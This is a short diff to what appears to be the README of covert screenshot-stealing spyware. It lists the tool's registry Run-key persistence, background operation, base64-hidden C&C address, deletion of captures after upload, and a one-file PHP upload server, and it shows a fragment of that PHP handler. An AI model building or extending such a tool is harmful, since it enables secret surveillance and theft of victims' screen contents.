@@ -13,7 +13,7 @@
  - Persistent (Using Registry Run Key)
  - Works in background 
  - Less Code Less Bugs
- - Deletes the screenshot on after upload it to C&C
+ - Deletes the screenshot from disk after upload it to C&C
  - C&C server in base64 
  - Upload screenshots in organized way on C&C
  - No port forwarding needed! works with a single php file
@@ -38,3 +38,4 @@ move_uploaded_file($_FILES["file"]["tmp_name"],
 unlink($del);
 ?>
 ```
+
